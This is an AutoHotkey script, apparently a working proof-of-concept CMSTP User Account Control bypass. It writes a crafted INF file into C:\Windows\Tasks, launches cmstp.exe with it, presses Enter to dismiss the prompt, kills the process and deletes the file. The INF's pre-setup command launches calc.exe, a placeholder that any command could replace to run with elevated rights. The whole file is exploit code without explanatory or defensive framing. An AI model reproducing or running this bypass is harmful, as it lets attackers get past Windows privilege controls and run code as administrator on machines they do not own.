#Requires AutoHotkey v2.0
#SingleInstance Force

; Define INF file path
infPath := "C:\Windows\Tasks\cmstp.ini"

; INF file contents
infContents := "
(
[version]
Signature=$chicago$
AdvancedINF=2.5
 
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
 
[RunPreSetupCommandsSection]
calc.exe
taskkill /IM cmstp.exe /F
 
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7
 
[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
 
[Strings]
ServiceName="bypassit"
ShortSvcName="bypassit"
)"
try {
    ; Write the INF file
    FileAppend(infContents, infPath)
    
    ; Run CMSTP
    Run('cmstp.exe /au "' infPath '"', A_WorkingDir)
    
    ; Wait for CMSTP window and send Enter
    Sleep(200)
    Send("{Enter}")
    
    ; Wait for CMSTP to process
    Sleep(1000)
    
    ; Clean up
    FileDelete(infPath)
} catch as err {
    MsgBox("Error: " err.Message)
}

ExitApp